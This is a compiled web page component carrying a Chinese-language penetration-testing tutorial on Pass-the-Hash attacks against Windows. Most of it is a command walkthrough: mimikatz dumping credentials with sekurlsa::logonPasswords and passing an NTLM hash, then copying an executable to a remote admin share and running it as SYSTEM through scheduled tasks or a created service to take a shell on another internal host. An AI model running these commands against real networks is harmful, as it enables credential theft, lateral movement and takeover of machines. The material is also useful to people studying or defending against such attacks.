import{_ as s,W as n,X as a,a1 as e}from"./framework-b6a07282.js";const t="/assets/1-fb842e3d.jpg",i={},c=e(`<h2 id="哈希传递攻击-pth" tabindex="-1"><a class="header-anchor" href="#哈希传递攻击-pth" aria-hidden="true">#</a> 哈希传递攻击（PTH）</h2><ul><li>哈希传递攻击（Pass the Hash），该方法通过找到与账户相关的密码散列值（通常是NTLM Hash）来进行攻击。</li><li>如果本地管理员的账号密码跟其他机器的本地管理员账号密码相同，那么攻击者就能使用哈希传递攻击的方式登录进内网中的其他计算机，且攻击者不需要花时间破解NTLM。在Windwos Server 2012R2及之后版本的操作系统中，默认内存中不会记录明文密码，因此攻击机需要使用工具（mimikatz）将散列值传递到其他计算机中，然后实现对目标机器的远程控制。</li><li>WinXP/2003/vista/2008，以及未打补丁之前的Win7/2008r2/win8/2012，这些环境我们都可以使用NTLM哈希传递。</li><li>当前用户为域普通用户或非域用户，想要取得其他机器更高权限可使用PTH。</li></ul><h3 id="哈希传递条件" tabindex="-1"><a class="header-anchor" href="#哈希传递条件" aria-hidden="true">#</a> 哈希传递条件</h3><ul><li>前提：有管理员的NTLM哈希、并且目标开放了445端口</li></ul><p>在工作组环境中：</p><p>Windwos Vista之后的机器，只能是administrator用户的哈希值才能进行哈希传递。</p><p>在域环境中：</p><p>只能是管理员组内用户（可以是administrator用户，也可以是管理员组内的其他用户）的哈希值可以进行哈希传递攻击。</p><h3 id="使用mimkatz进行hash传递" tabindex="-1"><a class="header-anchor" href="#使用mimkatz进行hash传递" aria-hidden="true">#</a> 使用mimkatz进行hash传递</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#背景：已控制了一台机器，目标是渗透另一台</span>

收集好administrator或同等权限的ntlm信息
sekurlsa::logonPasswords

<span class="token number">1</span>.想法设法将第一台靶机弄到system权限或administrator权限
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:hacker.com /ntlm:47bf8039a8506cd67c524a03ff84ba4e <span class="token comment">#命令成功后会在最初的靶机上弹出cmd，攻击完成。</span>
mimikatz sekurlsa::pth /user:administrator /domain:hacker.com /ntlm:administrator的ntlm

<span class="token number">2</span>.执行各种命令
net <span class="token function">time</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 <span class="token comment">#查看时间</span>
tasklist /s <span class="token number">192.168</span>.1.4 <span class="token comment">#查看进程</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#查看C盘</span>

<span class="token comment">#配合计划任务攻击夺取另一台内网机器的shell</span>
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>C$ <span class="token comment">#拷贝文件到目标主机C盘下</span>
schtasks /create /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#创建计划任务</span>
schtasks /run /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /i /tn <span class="token string">&quot;shellname&quot;</span> <span class="token comment">#运行计划任务</span>

schtasks /query /s <span class="token number">192.168</span>.1.4 /u administrator /p Aa123456 /TN c <span class="token comment">#查看计划任务</span>

SCHTASKS /DELETE /s controlfish.hacker.com /TN <span class="token string">&quot;shellname1&quot;</span> /f <span class="token comment">#强制删除计划任务</span>

<span class="token comment">#配合服务夺取另一台内网机器的shell</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 create servername <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /c c:<span class="token entity" title="\\a">\\a</span>rtifact.exe&quot;</span> <span class="token comment">#创建服务</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 start servername <span class="token comment">#启动服务</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="cs一键pth攻击-上线" tabindex="-1"><a class="header-anchor" href="#cs一键pth攻击-上线" aria-hidden="true">#</a> CS一键PTH攻击+上线</h3><img src="`+t+'">',12),l=[c];function p(o,r){return n(),a("div",null,l)}const d=s(i,[["render",p],["__file","哈希传递攻击（PTH）.html.vue"]]);export{d as default};
